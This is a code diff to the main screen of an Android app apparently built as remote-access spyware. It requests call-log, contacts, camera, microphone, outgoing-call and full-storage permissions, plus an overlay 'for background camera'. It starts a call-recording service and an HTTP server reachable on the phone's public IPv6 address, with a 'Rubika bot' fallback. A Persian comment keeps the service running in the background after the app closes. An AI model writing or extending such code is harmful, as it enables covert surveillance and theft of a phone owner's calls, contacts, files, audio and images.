@@ -1,8 +1,13 @@
 package com.security.ravan;
 
 import android.Manifest;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.net.ConnectivityManager;
+import android.net.LinkAddress;
+import android.net.LinkProperties;
+import android.net.Network;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
@@ -18,15 +23,8 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
-import java.net.HttpURLConnection;
 import java.net.Inet6Address;
-import java.net.InetAddress;
-import java.net.NetworkInterface;
-import java.net.URL;
 import java.util.ArrayList;
-import java.util.Collections;
 import java.util.List;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
@@ -41,15 +39,25 @@ public class MainActivity extends AppCompatActivity {
     private TextView tvServerUrl;
     private Button btnStartStop;
     private boolean isServerRunning = false;
+    
+    private static MainActivity instance;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        
+        instance = this;
 
         initViews();
         requestPermissions();
         updateUI();
+        
+        // اگر سرویس قبلاً روشن بود، UI رو آپدیت کن
+        if (HttpServerService.isRunning()) {
+            isServerRunning = true;
+            updateUI();
+        }
     }
 
     private void initViews() {
@@ -81,7 +89,6 @@ public class MainActivity extends AppCompatActivity {
 
         // Storage permissions based on Android version
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            // Android 13+
             if (ContextCompat.checkSelfPermission(this,
                     Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                 permissionsNeeded.add(Manifest.permission.READ_MEDIA_IMAGES);
@@ -99,44 +106,37 @@ public class MainActivity extends AppCompatActivity {
                 permissionsNeeded.add(Manifest.permission.POST_NOTIFICATIONS);
             }
         } else {
-            // Android 12 and below
             if (ContextCompat.checkSelfPermission(this,
                     Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                 permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
             }
         }
 
-        // Call logs permission
         if (ContextCompat.checkSelfPermission(this,
                 Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
             permissionsNeeded.add(Manifest.permission.READ_CALL_LOG);
         }
 
-        // Contacts permission
         if (ContextCompat.checkSelfPermission(this,
                 Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
             permissionsNeeded.add(Manifest.permission.READ_CONTACTS);
         }
 
-        // Phone state permission for device info
         if (ContextCompat.checkSelfPermission(this,
                 Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
             permissionsNeeded.add(Manifest.permission.READ_PHONE_STATE);
         }
 
-        // Camera permission
         if (ContextCompat.checkSelfPermission(this,
                 Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             permissionsNeeded.add(Manifest.permission.CAMERA);
         }
 
-        // Audio recording permission
         if (ContextCompat.checkSelfPermission(this,
                 Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
             permissionsNeeded.add(Manifest.permission.RECORD_AUDIO);
         }
 
-        // Process outgoing calls permission (for call detection)
         if (ContextCompat.checkSelfPermission(this,
                 Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED) {
             permissionsNeeded.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
@@ -147,7 +147,6 @@ public class MainActivity extends AppCompatActivity {
                     permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
         }
 
-        // Request MANAGE_EXTERNAL_STORAGE for Android 11+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!Environment.isExternalStorageManager()) {
                 try {
@@ -161,7 +160,6 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // Request overlay permission for background camera
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (!Settings.canDrawOverlays(this)) {
                 Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
@@ -211,7 +209,6 @@ public class MainActivity extends AppCompatActivity {
             startService(serviceIntent);
         }
 
-        // Start CallRecordService for call detection and recording
         Intent callServiceIntent = new Intent(this, CallRecordService.class);
         callServiceIntent.setAction("START_SERVICE");
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -240,28 +237,14 @@ public class MainActivity extends AppCompatActivity {
             btnStartStop.setText("Stop Server");
             btnStartStop.setBackgroundColor(getColor(android.R.color.holo_red_light));
 
-            tvIpAddress.setText("Fetching Public IPv6...");
-            tvServerUrl.setText("Please wait...");
-
-            getPublicIPv6Async(ip -> {
-                runOnUiThread(() -> {
-                    if (ip != null) {
-                        tvIpAddress.setText("IPv6: " + ip);
-                        tvServerUrl.setText("http://[" + ip + "]:8080");
-                    } else {
-                        // Fallback to local if public fetch fails
-                        String localIp = getLocalIPv6Address();
-                        if (localIp != null) {
-                            tvIpAddress.setText("IPv6 (Local): " + localIp);
-                            tvServerUrl.setText("http://[" + localIp + "]:8080");
-                        } else {
-                            tvIpAddress.setText("IPv6: Not available");
-                            tvServerUrl.setText("Check network connection");
-                        }
-                    }
-                });
-            });
-
+            String ipv6 = getPublicIPv6();
+            if (ipv6 != null) {
+                tvIpAddress.setText("IPv6: " + ipv6);
+                tvServerUrl.setText("http://[" + ipv6 + "]:8080");
+            } else {
+                tvIpAddress.setText("IPv6: Not available (using fallback)");
+                tvServerUrl.setText("Fallback mode - check Rubika bot");
+            }
         } else {
             tvStatus.setText("🔴 Server Stopped");
             tvStatus.setTextColor(getColor(android.R.color.holo_red_dark));
@@ -272,51 +255,56 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    public interface IpCallback {
-        void onResult(String ip);
-    }
-
-    public static void getPublicIPv6Async(IpCallback callback) {
-        ExecutorService executor = Executors.newSingleThreadExecutor();
-        executor.execute(() -> {
-            String publicIp = null;
-            try {
-                URL url = new URL("https://api64.ipify.org");
-                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
-                urlConnection.setConnectTimeout(5000);
-                urlConnection.setReadTimeout(5000);
-                BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
-                publicIp = in.readLine();
-                in.close();
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-
-            // If external fetch fails, try to find a global unicast address locally
-            if (publicIp == null) {
-                publicIp = getLocalIPv6Address();
-            }
-
-            callback.onResult(publicIp);
-        });
-        executor.shutdown();
-    }
-
-    // Renamed from getIPv6Address to avoid confusion
-    public static String getLocalIPv6Address() {
+    // دریافت IPv6 واقعی از شبکه
+    public static String getPublicIPv6() {
         try {
-            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
-            for (NetworkInterface intf : interfaces) {
-                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
-                for (InetAddress addr : addrs) {
-                    if (!addr.isLoopbackAddress() && addr instanceof Inet6Address) {
-                        String ip = addr.getHostAddress();
-                        // Remove zone index if present
+            ConnectivityManager cm = (ConnectivityManager) 
+                instance.getSystemService(Context.CONNECTIVITY_SERVICE);
+            Network activeNetwork = cm.getActiveNetwork();
+            LinkProperties linkProps = cm.getLinkProperties(activeNetwork);
+            
+            if (linkProps != null) {
+                for (LinkAddress addr : linkProps.getLinkAddresses()) {
+                    if (addr.getAddress() instanceof Inet6Address) {
+                        String ip = addr.getAddress().getHostAddress();
                         int idx = ip.indexOf('%');
                         if (idx >= 0) {
                             ip = ip.substring(0, idx);
                         }
-                        // Skip link-local addresses (fe80::)
+                        // فقط آدرس‌های Global (نه Link-Local fe80)
+                        if (!ip.toLowerCase().startsWith("fe80") && 
+                            !ip.equals("::1") &&
+                            addr.isGlobalPreferred()) {
+                            return ip;
+                        }
+                    }
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return null;
+    }
+
+    public static MainActivity getInstance() {
+        return instance;
+    }
+    
+    public static String getLocalIPv6Address() {
+        try {
+            ConnectivityManager cm = (ConnectivityManager) 
+                instance.getSystemService(Context.CONNECTIVITY_SERVICE);
+            Network activeNetwork = cm.getActiveNetwork();
+            LinkProperties linkProps = cm.getLinkProperties(activeNetwork);
+            
+            if (linkProps != null) {
+                for (LinkAddress addr : linkProps.getLinkAddresses()) {
+                    if (addr.getAddress() instanceof Inet6Address) {
+                        String ip = addr.getAddress().getHostAddress();
+                        int idx = ip.indexOf('%');
+                        if (idx >= 0) {
+                            ip = ip.substring(0, idx);
+                        }
                         if (!ip.toLowerCase().startsWith("fe80")) {
                             return ip;
                         }
@@ -327,6 +315,13 @@ public class MainActivity extends AppCompatActivity {
             e.printStackTrace();
         }
         return null;
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        // سرویس رو متوقف نکن! بذار توی پس‌زمینه کار کنه
+        // فقط UI رو آپدیت کن
     }
 
     @Override
